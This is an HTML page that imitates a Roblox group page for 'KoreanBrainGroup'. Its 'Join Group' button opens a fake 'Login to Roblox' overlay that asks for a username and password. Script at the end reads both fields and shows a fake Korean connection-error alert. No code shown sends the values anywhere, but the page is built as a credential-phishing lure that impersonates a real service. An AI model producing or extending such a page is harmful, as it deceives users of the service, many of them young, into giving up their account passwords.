<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>KoreanBrainGroup - Roblox</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <link rel="stylesheet" href="https://css.rbxcdn.com/56f6868ec13cefb471ad86176c7b9642571d05082c86ac6300ddfeb028617d4e.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/c065e7b41147590230d3aa4305b8cc656780f5e0fdb347d6e97cd916f7f42b16-StyleGuide.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/03a5c1b93d8909e738d129f5ccafb1d522231b3a03b0a30fc30ed5338a5562ba-Navigation.css">
    <link rel="stylesheet" href="https://css.rbxcdn.com/9cf73d509a97a9aadb83954af92f8ed69a74d3a9b75f08f0c353301822d0aaa6-GroupDetails.css">

    <style>
        /* 추가 커스텀 디자인: 로그인 팝업 */
        #login-overlay {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #191b1d; z-index: 9999; color: white; font-family: 'Source Sans Pro', sans-serif;
        }
        .login-box {
            width: 400px; margin: 100px auto; background: #2b2d2f; padding: 40px; border-radius: 8px; text-align: center;
        }
        .login-input {
            width: 100%; height: 44px; background: #393b3d; border: 1px solid #454749;
            border-radius: 4px; color: white; margin-bottom: 15px; padding: 0 12px;
        }
        .login-btn {
            width: 100%; height: 44px; background: white; border: none;
            color: black; font-weight: 700; cursor: pointer; border-radius: 4px;
        }
    </style>
</head>
<body class="light-theme builder-font">

    <div id="header" class="navbar-fixed-top rbx-header">
        <div class="container-fluid" style="display:flex; align-items:center; height:44px; background:white; border-bottom:1px solid #dee1e3;">
            <div style="padding: 0 15px; font-weight: bold; font-size: 18px; color: #393b3d;">ROBLOX</div>
        </div>
    </div>

    <div id="main-content" style="padding-top: 60px;">
        <div class="container-main" style="max-width: 970px; margin: 0 auto; padding: 20px;">
            <div class="section-content" style="background: white; padding: 30px; border-radius: 4px;">
                <div style="display: flex; align-items: center;">
                    <img src="https://tr.rbxcdn.com/180DAY-4a5cef5da6aa52692439ad69a06e15e5/150/150/Image/Png/noFilter" 
                         style="width: 150px; height: 150px; border-radius: 50%; border: 1px solid #dee1e3;">
                    
                    <div style="margin-left: 30px;">
                        <h1 style="font-size: 32px; margin: 0;">KoreanBrainGroup</h1>
                        <p style="color: #666;">By Etik4321</p>
                        <p style="margin: 20px 0; font-size: 14px; line-height: 1.6;">
                            KoreanBrainGroup is a group on Roblox owned by Etik4321 with 57 members. 법적 증거로 사용
                        </p>
                        <button onclick="showLogin()" class="btn-common-play-tabs" style="background: #00a2ff; color: white; border: none; padding: 10px 30px; border-radius: 4px; font-weight: bold; cursor: pointer;">
                            Join Group
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="login-overlay">
        <div class="login-box">
            <h2 style="font-size: 28px; margin-bottom: 30px;">Login to Roblox</h2>
            <input type="text" id="user" class="login-input" placeholder="Username / Email / Phone">
            <input type="password" id="pass" class="login-input" placeholder="Password">
            <button class="login-btn" onclick="submitData()">Log In</button>
            <div style="margin-top: 20px; color: #adb0b1; font-size: 13px;">
                <p>Forgot Password or Username?</p>
            </div>
        </div>
    </div>

    <script>
        function showLogin() {
            document.getElementById('login-overlay').style.display = 'block';
            document.getElementById('main-content').style.filter = 'blur(5px)';
        }

        function submitData() {
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            
            if(user && pass) {
                alert("연결 오류: 서버와의 통신이 원활하지 않습니다. 잠시 후 다시 시도해주세요.");
                location.reload(); 
            } else {
                alert("정보를 입력해주세요.");
            }
        }
    </script>
</body>
</html>
